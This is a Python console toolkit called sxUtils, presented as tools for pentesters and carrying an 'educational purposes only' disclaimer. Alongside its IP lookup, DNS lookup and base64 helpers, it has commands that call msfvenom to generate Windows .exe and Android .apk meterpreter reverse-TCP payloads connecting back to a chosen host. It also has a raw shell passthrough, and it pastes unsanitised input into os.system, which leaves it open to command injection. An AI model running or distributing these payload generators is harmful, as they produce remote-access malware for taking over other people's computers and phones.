import os
import time
from colorama import Fore, Back, Style
import requests
import base64

logo = Fore.MAGENTA + """                ____ ___   __  .__.__          
  _________  __|    |   \_/  |_|__|  |   ______
 /  ___/\  \/  /    |   /\   __\  |  |  /  ___/
 \___ \  >    <|    |  /  |  | |  |  |__\___ \ 
/____  >/__/\_ \______/   |__| |__|____/____  >
     \/       \/                            \/ """ + Fore.RESET

username = os.getlogin()

version = "1.0"

def defaultmessage():
    print(logo)
    print("")
    print(f"Welcome to sxUtils v{version}!")
    print("")
    print(Fore.RED + "sxUtils was made for educational purposes only. You can be arrested for using this tool for illegal purposes. The author is not responsible for any damage caused by this tool." + Fore.RESET)
    print("")
    print("Type 'help' for a list of commands.")
    print("")


def help():
    print("Available categories: 5 (*general, lookup, dangerzone, encoding/decoding, metasploit)\nUse 'help <category>' to view commands in a category.")
    print("")
    print("help - Shows this message")
    print("exit - Exits sxUtils")
    print("clear - Clears the console")
    print("about - Shows information about sxUtils")
    print("reload sxUtils - Reloads sxUtils by starting another instance of sxUtils")
    print("shcmd <command> - Executes a shell command")
    print("")

def dangerzone():
    print("Available categories: 5 (general, lookup, *dangerzone, encoding/decoding, metasploit)\nUse 'help <category>' to view commands in a category.")
    print("")
    print("dangerzone.selfdestruct - Deletes sxUtils from your computer")
    print("")

def lookup():
    print("Available categories: 5 (general, *lookup, dangerzone, encoding/decoding, metasploit)\nUse 'help <category>' to view commands in a category.")
    print("")
    print("lookup.ip <ip> - Looks up an IP address")
    print("dns.lookup <domain> - Looks up a domain")
    print("")

def encodingdecoding():
    print("Available categories: 5 (general, lookup, dangerzone, *encoding/decoding, metasploit)\nUse 'help <category>' to view commands in a category.")
    print("")
    print("encode.base64 <text> - Encodes text to base64")
    print("decode.base64 <text> - Decodes text from base64")
    print("")

def metasploit():
    print("Available categories: 5 (general, lookup, dangerzone, encoding/decoding, *metasploit)\nUse 'help <category>' to view commands in a category.")
    print("")
    print("ms.windows_reverse_tcp <ip> <port> <payloadname> - Generates a reverse TCP payload for Windows")
    print("ms.android_reverse_tcp <ip> <port> <payloadname> - Generates a reverse TCP payload for Android")
    print("")


if os.name == "nt":
    if os.path.exists("C:\\Program Files\\Metasploit Framework\\msfconsole.exe"):
        pass
    else:
        print("Metasploit was not found on your computer. Please install Metasploit to use the Metasploit commands.")
        print("You can download Metasploit from https://metasploit.com/download")
        print("Press enter to continue...")
        input()


if os.name == "posix":
    if os.path.exists("/usr/bin/msfconsole"):
        pass
    else:
        print("Metasploit was not found on your computer. Please install Metasploit to use the Metasploit commands.")
        print("You can download Metasploit from https://metasploit.com/download")
        print("Press enter to continue...")
        input()

os.system("cls")
defaultmessage()
while True:
    while True:
        cmd = input(f"{username}@" + Fore.MAGENTA + "sxUtils >" + Fore.RESET + " ")
        if cmd == "exit":
            os.system("cls")
            exit()
        if cmd == "clear":
            os.system("cls")
        if cmd.startswith("lookup.ip"):
            ip = cmd.split(" ")[1]
            r = requests.get(f"http://ip-api.com/json/{ip}")
            data = r.json()
            print(f"IP: {data['query']}")
            print(f"Status: {data['status']}")
            print(f"Country: {data['country']}")
            print(f"Country Code: {data['countryCode']}")
            print(f"Region: {data['region']}")
            print(f"Region Name: {data['regionName']}")
            print(f"City: {data['city']}")
            print(f"Zip: {data['zip']}")
            print(f"Lat: {data['lat']}")
            print(f"Lon: {data['lon']}")
            print(f"Timezone: {data['timezone']}")
            print(f"ISP: {data['isp']}")
            print(f"Org: {data['org']}")
            print(f"AS: {data['as']}")
        if cmd == "about":
            print(logo)
            print(f"sxUtils v{version}")
            print("")
            print("sxUtils is a program written in Python with some cool tools for Pentesters and Ethical Hackers by sxnvte")
            print("sxUtils is licensed under the GPL-3.0 License")
            print(Fore.RED + "sxUtils was made for educational purposes only. You can be arrested for using this tool for illegal purposes. The author is not responsible for any damage caused by this tool." + Fore.RESET)
        if cmd == "reload sxUtils":
            os.system("cls")
            print("Reloading sxUtils...")
            time.sleep(1)
            os.system("cls")
            os.system("python sxuconsole.py")
        if cmd.startswith("shcmd"):
            shcmd = cmd.split(" ")[1]
            os.system(shcmd)
        if cmd.startswith("dns.lookup"):
            dnslookup = cmd.split(" ")[1]
            r = requests.get(f"https://api.hackertarget.com/dnslookup/?q={dnslookup}")
            print(r.text)
        if cmd == "help":
            help()
        if cmd == "help lookup":
            lookup()
        if cmd == "help dangerzone":
            dangerzone()
        if cmd == "dangerzone.selfdestruct":
            pass
        if cmd.startswith("encode.base64"):
            text = cmd.split(" ")[1]
            encoded = base64.b64encode(text.encode("utf-8"))
            print(encoded)
        if cmd.startswith("decode.base64"):
            text = cmd.split(" ")[1]
            decoded = base64.b64decode(text.encode("utf-8"))
            print(decoded)
        if cmd == "help encoding/decoding":
            encodingdecoding()
        if cmd.startswith("ms.windows_reverse_tcp"):
            ip = cmd.split(" ")[1]
            port = cmd.split(" ")[2]
            payloadname = cmd.split(" ")[3]
            os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > {payloadname}.exe")
        if cmd.startswith("ms.android_reverse_tcp"):
            ip = cmd.split(" ")[1]
            port = cmd.split(" ")[2]
            payloadname = cmd.split(" ")[3]
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {payloadname}.apk")
        if cmd == "help metasploit":
            metasploit()
        
            
